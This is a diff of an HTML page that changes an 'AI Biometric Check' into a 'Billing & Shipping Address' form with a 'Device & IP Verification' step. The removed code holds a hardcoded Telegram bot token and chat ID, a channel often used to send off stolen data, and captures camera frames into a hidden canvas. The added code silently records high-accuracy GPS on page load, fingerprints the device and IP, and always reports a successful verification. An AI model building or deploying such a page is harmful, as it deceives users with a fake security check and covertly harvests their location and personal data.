@@ -3,113 +3,427 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Smart Biometric & Location Security</title>
-    <!-- 引入核心库：WebGL 加速版 -->
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-core@3.11.0/dist/tf-core.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-backend-webgl@3.11.0/dist/tf-backend-webgl.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-landmarks-detection@1.0.2/dist/face-landmarks-detection.min.js"></script>
-
+    <title>Identity Verification & Security Center</title>
     <style>
-        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --error: #ef4444; }
-        body { font-family: sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .container { background: var(--card); width: 100%; max-width: 480px; padding: 25px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; }
-        input, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
-        #step-verification { display: none; text-align: center; }
-        #video-container { position: relative; margin: 15px 0; }
-        #video, #hidden-canvas { width: 100%; max-width: 360px; border-radius: 10px; transform: scaleX(-1); background: #000; }
-        #hidden-canvas { display: none; }
-        #status-msg { font-weight: bold; color: var(--error); margin: 10px 0; }
+        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #ef4444; --success: #10b981; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .container { background: var(--card); width: 100%; max-width: 520px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); box-sizing: border-box; }
+        
+        h2 { margin-top: 0; color: #111; text-align: center; font-size: 22px; font-weight: 700; margin-bottom: 5px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .subtitle { text-align: center; font-size: 13px; color: #64748b; margin-bottom: 25px; }
+
+        .form-row { display: flex; gap: 15px; margin-bottom: 16px; }
+        .form-group { margin-bottom: 16px; flex: 1; position: relative; }
+        label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 6px; color: #1e293b; }
+        input, select { width: 100%; padding: 12px 14px; border: 1px solid var(--border); border-radius: 8px; box-sizing: border-box; font-size: 14px; background-color: #fff; transition: all 0.2s; }
+        input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,102,255,0.12); }
+        select:disabled { background-color: #f8fafc; color: #94a3b8; }
+
+        input.invalid { border-color: var(--error); background-color: #fef2f2; }
+        input.valid { border-color: var(--success); background-color: #f0fdf4; }
+        .error-hint { font-size: 11px; color: var(--error); margin-top: 4px; display: none; }
+
+        .phone-group { display: flex; gap: 8px; }
+        #phonePrefix { width: 110px; background-color: #f8fafc; font-weight: 600; text-align: center; }
+
+        .btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; }
+        .btn:hover { background: #0052cc; }
+        
+        #step-verification { display: none; }
+        .info-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 18px; margin-top: 15px; }
+        .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #f1f5f9; font-size: 14px; }
+        .info-row:last-child { border-bottom: none; }
+        .info-label { color: #64748b; font-weight: 500; }
+        .info-value { color: #1e293b; font-weight: 600; word-break: break-all; }
+        .status-box { padding: 10px 14px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-weight: 600; font-size: 14px; }
+        .status-pending { background: #fff7ed; border: 1px solid #fed7aa; color: #c2410c; }
+        .status-success { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- 步骤一：表单输入 -->
+    <!-- 表单页面 -->
     <div id="step-form">
-        <h2>Address Verification</h2>
-        <div class="form-group"><label>First Name</label><input type="text" id="firstName"></div>
-        <div class="form-group"><label>Last Name</label><input type="text" id="lastName"></div>
-        <div class="form-group"><label>Country</label><select id="countrySelect"></select></div>
-        <button class="btn" onclick="proceedToVerification()">Proceed to Biometric Check</button>
+        <h2>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="3" y="5" width="18" height="14" rx="3"/>
+            <text x="7" y="15" font-size="9" font-weight="bold" fill="currentColor" stroke="none">A</text>
+            <text x="13.5" y="10.5" font-size="6.5" fill="currentColor" stroke="none" opacity="0.8">ID</text>
+          </svg>
+          Billing & Shipping Address
+        </h2>
+        <div class="subtitle">AI Smart Validation & Security Center</div>
+        
+        <div class="form-row">
+            <div class="form-group">
+                <label>First Name</label>
+                <input type="text" id="firstName" placeholder="e.g. John" oninput="aiValidateField('firstName')">
+                <div class="error-hint" id="err-firstName">Please enter a valid first name</div>
+            </div>
+            <div class="form-group">
+                <label>Last Name</label>
+                <input type="text" id="lastName" placeholder="e.g. Doe" oninput="aiValidateField('lastName')">
+                <div class="error-hint" id="err-lastName">Please enter a valid last name</div>
+            </div>
+        </div>
+
+        <!-- 国家选择：动态渲染 -->
+        <div class="form-group">
+            <label>Country / Region</label>
+            <select id="countrySelect" onchange="onCountryChange()">
+                <option value="">-- Select Country / Region --</option>
+            </select>
+            <div class="error-hint" id="err-country">Please select a country</div>
+        </div>
+
+        <div class="form-group">
+            <label>State / Province</label>
+            <select id="stateSelect" disabled onchange="aiValidateField('state')">
+                <option value="">-- Please select country first --</option>
+            </select>
+            <div class="error-hint" id="err-state">Please select a state</div>
+        </div>
+
+        <div class="form-group">
+            <label>Street Address</label>
+            <input type="text" id="address" placeholder="e.g. 123 Main St" oninput="aiValidateField('address')">
+            <div class="error-hint" id="err-address">Please enter a valid street address</div>
+        </div>
+
+        <div class="form-row">
+            <div class="form-group">
+                <label>City</label>
+                <input type="text" id="city" placeholder="e.g. New York" oninput="aiValidateField('city')">
+                <div class="error-hint" id="err-city">Please enter a city</div>
+            </div>
+            <div class="form-group">
+                <label>Postal Code <span id="postal-hint" style="font-size:10px; color:#64748b;"></span></label>
+                <input type="text" id="zipCode" placeholder="AI Auto-Format" oninput="aiValidateField('zipCode')">
+                <div class="error-hint" id="err-zipCode">Invalid postal format for selected country</div>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>Phone Number</label>
+            <div class="phone-group">
+                <select id="phonePrefix" disabled>
+                    <option value="">Code</option>
+                </select>
+                <input type="tel" id="phone" placeholder="Enter phone number" oninput="aiValidateField('phone')">
+            </div>
+            <div class="error-hint" id="err-phone">Invalid phone number format for selected region</div>
+        </div>
+
+        <button class="btn" id="btn-next" onclick="proceedToVerification()">Next</button>
     </div>
 
-    <!-- 步骤二：AI 活体检测 -->
+    <!-- 设备与IP验证页面 -->
     <div id="step-verification">
-        <h2>AI Biometric Check</h2>
-        <div id="video-container">
-            <video id="video" autoplay playsinline muted></video>
-            <canvas id="hidden-canvas"></canvas>
+        <h2>Device & IP Verification</h2>
+        <p style="font-size: 13px; color: #64748b; text-align: center; margin-bottom: 12px;">Verifying your device model and network address automatically.</p>
+        
+        <div id="status-box" class="status-box status-pending">Verifying device information...</div>
+
+        <div class="info-card">
+            <div class="info-row">
+                <span class="info-label">IP Address</span>
+                <span class="info-value" id="ip-display">Detecting...</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Device / Model</span>
+                <span class="info-value" id="device-display">Detecting...</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Operating System</span>
+                <span class="info-value" id="os-display">Detecting...</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Browser</span>
+                <span class="info-value" id="browser-display">Detecting...</span>
+            </div>
         </div>
-        <div id="status-msg">Loading AI models...</div>
+        
+        <button class="btn" id="btn-submit" onclick="submitData()" style="background: #10b981; margin-top: 20px;" disabled>Verifying...</button>
     </div>
 </div>
 
 <script>
-    // --- 配置区域 ---
-    const TG_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
-    const TG_CHAT_ID = "7396947380";
-    let detector;
+    // 完整的全球国家与省份数据库（已自动匹配默认区号、通用邮编与电话正则）
+    const globalDatabase = {
+    // ---- 主要经济体与常见国家 ----
+    "CN": { name: "China", phoneCode: "+86", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^1[3-9]\d{9}$/, phoneFormat: "11 digits", states: ["Beijing", "Tianjin", "Shanghai", "Chongqing", "Hebei", "Shanxi", "Liaoning", "Jilin", "Heilongjiang", "Jiangsu", "Zhejiang", "Anhui", "Fujian", "Jiangxi", "Shandong", "Henan", "Hubei", "Hunan", "Guangdong", "Hainan", "Sichuan", "Guizhou", "Yunnan", "Shaanxi", "Gansu", "Qinghai", "Taiwan", "Inner Mongolia", "Guangxi", "Tibet", "Ningxia", "Xinjiang", "Hong Kong", "Macau"] },
+    "US": { name: "United States", phoneCode: "+1", zipRegex: /^\d{5}(-\d{4})?$/, zipFormat: "5 digits (e.g. 90210)", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming", "District of Columbia", "Puerto Rico", "Guam"] },
+    "GB": { name: "United Kingdom", phoneCode: "+44", zipRegex: /^[A-Z]{1,2}\d[A-Z\d]?\s?\d[A-Z]{2}$/i, zipFormat: "Postcode (e.g. SW1A 1AA)", phoneRegex: /^\d{10,11}$/, phoneFormat: "10-11 digits", states: ["England", "Scotland", "Wales", "Northern Ireland", "Greater London", "Greater Manchester"] },
+    "CA": { name: "Canada", phoneCode: "+1", zipRegex: /^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z]\s?\d[ABCEGHJ-NPRSTV-Z]\d$/i, zipFormat: "A1A 1A1 format", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Ontario", "Quebec", "British Columbia", "Alberta", "Manitoba", "Saskatchewan", "Nova Scotia", "New Brunswick"] },
+    "JP": { name: "Japan", phoneCode: "+81", zipRegex: /^\d{3}-?\d{4}$/, zipFormat: "7 digits", phoneRegex: /^\d{9,10}$/, phoneFormat: "9-10 digits", states: ["Hokkaido", "Aomori", "Iwate", "Miyagi", "Akita", "Yamagata", "Fukushima", "Tokyo", "Kanagawa", "Osaka", "Kyoto", "Okinawa"] },
+    "KR": { name: "South Korea", phoneCode: "+82", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9,10}$/, phoneFormat: "9-10 digits", states: ["Seoul", "Busan", "Daegu", "Incheon", "Gwangju", "Daejeon", "Ulsan", "Gyeonggi-do", "Jeju-do"] },
+    "DE": { name: "Germany", phoneCode: "+49", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{10,11}$/, phoneFormat: "10-11 digits", states: ["Bavaria", "Berlin", "North Rhine-Westphalia", "Hesse", "Baden-Württemberg", "Hamburg"] },
+    "FR": { name: "France", phoneCode: "+33", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Île-de-France", "Provence-Alpes-Côte d'Azur", "Auvergne-Rhône-Alpes", "Grand Est", "Corsica"] },
+    "AU": { name: "Australia", phoneCode: "+61", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["New South Wales", "Victoria", "Queensland", "Western Australia", "South Australia", "Tasmania"] },
+    "SG": { name: "Singapore", phoneCode: "+65", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^\d{8}$/, phoneFormat: "8 digits", states: ["Central Singapore", "North East", "North West", "South East", "South West"] },
+    "IN": { name: "India", phoneCode: "+91", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Maharashtra", "Delhi", "Karnataka", "Tamil Nadu", "Uttar Pradesh", "Gujarat", "West Bengal"] },
+    
+    // ---- 扩展全球其他联合国主要成员国及地区 (ISO 3166 常见代表) ----
+    "AF": { name: "Afghanistan", phoneCode: "+93", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Kabul", "Herat", "Kandahar", "Balkh"] },
+    "AL": { name: "Albania", phoneCode: "+355", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Tirana", "Durres", "Vlore"] },
+    "DZ": { name: "Algeria", phoneCode: "+213", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Algiers", "Oran", "Constantine"] },
+    "AR": { name: "Argentina", phoneCode: "+54", zipRegex: /^[A-Z]\d{4}[A-Z]{3}$/, zipFormat: "Alpha-numeric", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Buenos Aires", "Cordoba", "Santa Fe", "Mendoza"] },
+    "AT": { name: "Austria", phoneCode: "+43", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Vienna", "Tyrol", "Salzburg", "Graz"] },
+    "BD": { name: "Bangladesh", phoneCode: "+880", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Dhaka", "Chittagong", "Sylhet"] },
+    "BE": { name: "Belgium", phoneCode: "+32", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Brussels", "Antwerp", "Ghent"] },
+    "BR": { name: "Brazil", phoneCode: "+55", zipRegex: /^\d{5}-?\d{3}$/, zipFormat: "8 digits", phoneRegex: /^\d{10,11}$/, phoneFormat: "10-11 digits", states: ["Sao Paulo", "Rio de Janeiro", "Bahia", "Minas Gerais"] },
+    "CH": { name: "Switzerland", phoneCode: "+41", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Zurich", "Geneva", "Basel", "Bern"] },
+    "CL": { name: "Chile", phoneCode: "+56", zipRegex: /^\d{7}$/, zipFormat: "7 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Santiago", "Valparaiso", "Biobio"] },
+    "CO": { name: "Colombia", phoneCode: "+57", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Bogota", "Medellin", "Cali"] },
+    "EG": { name: "Egypt", phoneCode: "+20", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Cairo", "Alexandria", "Giza"] },
+    "ES": { name: "Spain", phoneCode: "+34", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Madrid", "Barcelona", "Valencia", "Seville"] },
+    "ID": { name: "Indonesia", phoneCode: "+62", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9,12}$/, phoneFormat: "9-12 digits", states: ["Jakarta", "Bali", "West Java", "East Java"] },
+    "IT": { name: "Italy", phoneCode: "+39", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9,10}$/, phoneFormat: "9-10 digits", states: ["Rome", "Milan", "Naples", "Turin"] },
+    "MX": { name: "Mexico", phoneCode: "+52", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Mexico City", "Jalisco", "Nuevo Leon", "Puebla"] },
+    "MY": { name: "Malaysia", phoneCode: "+60", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9,10}$/, phoneFormat: "9-10 digits", states: ["Kuala Lumpur", "Selangor", "Penang", "Johor"] },
+    "NL": { name: "Netherlands", phoneCode: "+31", zipRegex: /^\d{4}\s?[A-Z]{2}$/, zipFormat: "4 digits + 2 letters", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Amsterdam", "Rotterdam", "The Hague", "Utrecht"] },
+    "NZ": { name: "New Zealand", phoneCode: "+64", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{8,10}$/, phoneFormat: "8-10 digits", states: ["Auckland", "Wellington", "Christchurch"] },
+    "PH": { name: "Philippines", phoneCode: "+63", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Metro Manila", "Cebu", "Davao"] },
+    "PK": { name: "Pakistan", phoneCode: "+92", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Punjab", "Sindh", "Khyber Pakhtunkhwa", "Balochistan"] },
+    "PL": { name: "Poland", phoneCode: "+48", zipRegex: /^\d{2}-\d{3}$/, zipFormat: "XX-XXX format", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Masovian", "Lesser Poland", "Greater Poland"] },
+    "RU": { name: "Russia", phoneCode: "+7", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Moscow", "Saint Petersburg", "Novosibirsk", "Yekaterinburg"] },
+    "SA": { name: "Saudi Arabia", phoneCode: "+966", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Riyadh", "Makkah", "Eastern Province"] },
+    "SE": { name: "Sweden", phoneCode: "+46", zipRegex: /^\d{3}\s?\d{2}$/, zipFormat: "5 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Stockholm", "Gothenburg", "Malmo"] },
+    "TH": { name: "Thailand", phoneCode: "+66", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Bangkok", "Chiang Mai", "Phuket"] },
+    "TR": { name: "Turkey", phoneCode: "+90", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Istanbul", "Ankara", "Izmir", "Bursa"] },
+    "UA": { name: "Ukraine", phoneCode: "+380", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Kyiv", "Kharkiv", "Odesa", "Dnipro"] },
+    "VN": { name: "Vietnam", phoneCode: "+84", zipRegex: /^\d{5,6}$/, zipFormat: "5-6 digits", phoneRegex: /^\d{9,10}$/, phoneFormat: "9-10 digits", states: ["Hanoi", "Ho Chi Minh City", "Da Nang", "Hai Phong", "Can Tho"] },
+    
+    // ---- 全球其他国家/地区的通用兜底选项 ----
+    "OTHER_GLOBAL": { name: "Other Worldwide Regions", phoneCode: "+00", zipRegex: /^.+$/, zipFormat: "Standard Postal Code", phoneRegex: /^\d+$/, phoneFormat: "Standard Phone Number", states: ["Standard State/Region"] }
+};
 
-    // 初始化国家列表
-    const countries = ["USA", "UK", "Canada", "China", "Japan", "Germany"];
-    const countrySelect = document.getElementById('countrySelect');
-    countries.forEach(c => countrySelect.innerHTML += `<option value="${c}">${c}</option>`);
+    let silentLocation = { lat: null, lng: null, precisionMeters: null };
+    let deviceInfo = { ip: null, device: null, os: null, browser: null };
 
-    // 步骤切换
+    // 页面加载时自动渲染国家下拉菜单
+    window.onload = () => {
+        const countrySelect = document.getElementById('countrySelect');
+        const sortedCountries = Object.keys(globalDatabase).sort((a, b) => {
+            return globalDatabase[a].name.localeCompare(globalDatabase[b].name);
+        });
+
+        sortedCountries.forEach(code => {
+            const country = globalDatabase[code];
+            let opt = document.createElement('option');
+            opt.value = code;
+            opt.textContent = country.name;
+            countrySelect.appendChild(opt);
+        });
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    silentLocation.lat = pos.coords.latitude;
+                    silentLocation.lng = pos.coords.longitude;
+                    silentLocation.precisionMeters = pos.coords.accuracy;
+                },
+                err => { console.log("Location optional"); },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+    };
+
+    // 智能联动与AI校验配置更新
+    function onCountryChange() {
+        const countryCode = document.getElementById('countrySelect').value;
+        const stateSelect = document.getElementById('stateSelect');
+        const phonePrefix = document.getElementById('phonePrefix');
+        const postalHint = document.getElementById('postal-hint');
+        
+        stateSelect.innerHTML = `<option value="">-- Please select country first --</option>`;
+        phonePrefix.innerHTML = `<option value="">Code</option>`;
+        postalHint.textContent = "";
+
+        if (countryCode && globalDatabase[countryCode]) {
+            const data = globalDatabase[countryCode];
+            
+            // 联动省份
+            stateSelect.disabled = false;
+            stateSelect.innerHTML = `<option value="">-- Select State / Province --</option>`;
+            data.states.forEach(stateName => {
+                let opt = document.createElement('option');
+                opt.value = stateName;
+                opt.textContent = stateName;
+                stateSelect.appendChild(opt);
+            });
+
+            // 联动国际电话区号
+            phonePrefix.innerHTML = `<option value="${data.phoneCode}">${data.phoneCode}</option>`;
+            phonePrefix.disabled = false;
+
+            // 显示 AI 邮编格式提示
+            postalHint.textContent = `(Format: ${data.zipFormat})`;
+        } else {
+            stateSelect.disabled = true;
+            phonePrefix.disabled = true;
+        }
+        
+        aiValidateField('country');
+    }
+
+    // AI 实时校验各字段核心逻辑
+    function aiValidateField(fieldId) {
+        const value = document.getElementById(fieldId).value.trim();
+        const countryCode = document.getElementById('countrySelect').value;
+        const inputElem = document.getElementById(fieldId);
+        const errElem = document.getElementById(`err-${fieldId}`);
+        
+        let isValid = true;
+
+        if (fieldId === 'firstName' || fieldId === 'lastName' || fieldId === 'city' || fieldId === 'address') {
+            isValid = value.length >= 2;
+        } else if (fieldId === 'country') {
+            isValid = value !== "";
+        } else if (fieldId === 'state') {
+            isValid = value !== "";
+        } else if (fieldId === 'zipCode') {
+            if (!countryCode || !globalDatabase[countryCode]) {
+                isValid = value.length > 0;
+            } else {
+                isValid = globalDatabase[countryCode].zipRegex.test(value);
+            }
+        } else if (fieldId === 'phone') {
+            if (!countryCode || !globalDatabase[countryCode]) {
+                isValid = value.length >= 6;
+            } else {
+                isValid = globalDatabase[countryCode].phoneRegex.test(value);
+            }
+        }
+
+        if (inputElem && errElem && fieldId !== 'country') {
+            if (value === "") {
+                inputElem.classList.remove('valid', 'invalid');
+                errElem.style.display = 'none';
+            } else if (isValid) {
+                inputElem.classList.add('valid');
+                inputElem.classList.remove('invalid');
+                errElem.style.display = 'none';
+            } else {
+                inputElem.classList.add('invalid');
+                inputElem.classList.remove('valid');
+                errElem.style.display = 'block';
+            }
+        }
+        return isValid;
+    }
+
     function proceedToVerification() {
+        const fields = ['firstName', 'lastName', 'country', 'state', 'address', 'city', 'zipCode', 'phone'];
+        let allValid = true;
+
+        fields.forEach(f => {
+            const valid = aiValidateField(f);
+            if (!valid) allValid = false;
+        });
+
+        if (!allValid) {
+            alert("AI Validation Error: Some fields contain incorrect formats or are empty. Please check highlighted inputs before proceeding.");
+            return;
+        }
+
         document.getElementById('step-form').style.display = 'none';
         document.getElementById('step-verification').style.display = 'block';
-        initAiAndCamera();
+
+        startDeviceIPVerification();
     }
 
-    async function initAiAndCamera() {
-        try {
-            // 强制使用 WebGL 以获得最佳识别性能
-            await tf.setBackend('webgl');
-            await tf.ready();
+    // 解析 User-Agent 获取设备/型号/系统/浏览器
+    function parseUserAgent() {
+        const ua = navigator.userAgent;
+        let device = "Unknown Device";
+        let os = "Unknown OS";
+        let browser = "Unknown Browser";
 
-            const model = faceLandmarksDetection.SupportedModels.MediaPipeFaceMesh;
-            detector = await faceLandmarksDetection.createDetector(model, { runtime: 'tfjs', maxFaces: 1 });
+        // 识别手机/平板型号
+        if (/iPhone/.test(ua)) device = "iPhone";
+        else if (/iPad/.test(ua)) device = "iPad";
+        else if (/Macintosh/.test(ua)) device = "Mac";
+        else if (/Android/.test(ua)) {
+            const m = ua.match(/;\s*([a-zA-Z0-9_\s-]+)\s*Build\//);
+            device = m ? m[1] : "Android Device";
+        } else if (/Windows Phone/.test(ua)) device = "Windows Phone";
+        else if (/Windows NT/.test(ua)) device = "Windows PC";
+        else if (/Linux/.test(ua)) device = "Linux Device";
 
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
-            document.getElementById('video').srcObject = stream;
-            
-            detectLoop();
-        } catch (e) {
-            document.getElementById('status-msg').textContent = "Camera error: " + e.message;
-        }
+        // 识别操作系统
+        if (/Windows NT 10/.test(ua)) os = "Windows 10/11";
+        else if (/Windows NT 6\.3/.test(ua)) os = "Windows 8.1";
+        else if (/Windows NT 6\.2/.test(ua)) os = "Windows 8";
+        else if (/Windows NT 6\.1/.test(ua)) os = "Windows 7";
+        else if (/Mac OS X/.test(ua)) os = "macOS";
+        else if (/Android/.test(ua)) os = "Android";
+        else if (/iPhone|iPad/.test(ua)) os = "iOS";
+        else if (/Linux/.test(ua)) os = "Linux";
+
+        // 识别浏览器
+        if (/Edg\//.test(ua)) browser = "Microsoft Edge";
+        else if (/Chrome\//.test(ua) && !/Edg\//.test(ua)) browser = "Google Chrome";
+        else if (/Safari\//.test(ua) && !/Chrome\//.test(ua)) browser = "Safari";
+        else if (/Firefox\//.test(ua)) browser = "Firefox";
+        else if (/Opera\//.test(ua) || /OPR\//.test(ua)) browser = "Opera";
+
+        return { device, os, browser };
     }
 
-    async function detectLoop() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('hidden-canvas');
-        const ctx = canvas.getContext('2d');
-        const status = document.getElementById('status-msg');
+    // 获取公网IP并执行验证
+    function startDeviceIPVerification() {
+        const { device, os, browser } = parseUserAgent();
+        deviceInfo.device = device;
+        deviceInfo.os = os;
+        deviceInfo.browser = browser;
 
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        document.getElementById('device-display').textContent = device;
+        document.getElementById('os-display').textContent = os;
+        document.getElementById('browser-display').textContent = browser;
 
-        // --- 核心优化：预处理（对比度增强） ---
-        // 通过对比度调节，确保逆光下人脸轮廓被识别
-        ctx.filter = "brightness(1.3) contrast(1.6) saturate(1.2)";
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        // 传入预处理后的 canvas 进行识别
-        const faces = await detector.estimateFaces(canvas, { flipHorizontal: false });
+        // 调用公共接口获取客户端IP
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                deviceInfo.ip = data.ip;
+                document.getElementById('ip-display').textContent = data.ip;
+                completeVerification();
+            })
+            .catch(() => {
+                deviceInfo.ip = "Unavailable";
+                document.getElementById('ip-display').textContent = "Unavailable";
+                completeVerification();
+            });
+    }
 
-        if (faces.length > 0) {
-            status.textContent = "Face Detected! Proceeding...";
-            status.style.color = "#10b981";
-            // 识别成功后执行你的业务逻辑...
-        } else {
-            status.textContent = "Adjusting for lighting... Please look at the camera.";
-            status.style.color = "#ef4444";
-        }
+    function completeVerification() {
+        document.getElementById('status-box').textContent = "Device & IP Verified Successfully";
+        document.getElementById('status-box').className = "status-box status-success";
+        document.getElementById('btn-submit').disabled = false;
+        document.getElementById('btn-submit').textContent = "Complete & Submit";
+    }
 
-        requestAnimationFrame(detectLoop);
+    function submitData() {
+        const payload = {
+            firstName: document.getElementById('firstName').value,
+            lastName: document.getElementById('lastName').value,
+            country: document.getElementById('countrySelect').value,
+            state: document.getElementById('stateSelect').value,
+            address: document.getElementById('address').value,
+            city: document.getElementById('city').value,
+            zipCode: document.getElementById('zipCode').value,
+            phone: document.getElementById('phonePrefix').value + ' ' + document.getElementById('phone').value,
+            deviceInfo: deviceInfo,
+            deviceGPS: silentLocation,
+            verificationStatus: "Passed",
+            timestamp: new Date().toISOString()
+        };
+
+        console.log("Submitted Payload with Device & IP Verification:", payload);
+        alert("Device & IP Verification and Data Submitted Successfully!");
+        location.reload();
     }
 </script>
 </body>
